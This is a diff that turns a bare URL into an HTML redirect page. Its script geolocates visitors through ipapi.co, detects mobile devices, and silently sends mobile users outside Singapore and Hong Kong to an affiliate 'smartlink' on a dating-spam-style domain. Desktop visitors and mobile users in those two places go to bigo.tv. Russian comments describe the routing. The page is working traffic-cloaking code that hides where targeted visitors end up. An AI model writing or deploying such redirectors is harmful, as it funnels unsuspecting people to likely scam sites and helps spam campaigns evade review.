@@ -1,1 +1,43 @@
-https://rpexxx.github.io/aniqa/for1n 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect Page</title>
+</head>
+<body>
+    <script>
+        function getCountry() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const country = data.country_code;
+                    const isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
+
+                    // ТВОЯ ЛОГИКА:
+                    if (isMobile && (country === 'SG' || country === 'HK')) {
+                        // 📱 Мобильные из SG/HK → bigo.tv
+                        window.location.href = 'https://www.bigo.tv/show/';
+                    } else if (isMobile) {
+                        // 📱 Мобильные (не из SG/HK) → смартлинк
+                        window.location.href = 'https://gvvkv.bilsteringdates.net/?utm_source=da57dc555e50572d&ban=other&j1=1&j5=1&s1=15847&s2=2105458&click_id=LB3';
+                    } else {
+                        // 🖥️ Десктопы (любые) → bigo.tv
+                        window.location.href = 'https://www.bigo.tv/show/';
+                    }
+                })
+                .catch(error => {
+                    // При ошибке API
+                    const isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
+                    if (isMobile) {
+                        window.location.href = 'https://gvvkv.bilsteringdates.net/?utm_source=da57dc555e50572d&ban=other&j1=1&j5=1&s1=15847&s2=2105458&click_id=LB3';
+                    } else {
+                        window.location.href = 'https://www.bigo.tv/show/';
+                    }
+                });
+        }
+
+        window.onload = getCountry;
+    </script>
+</body>
+</html>
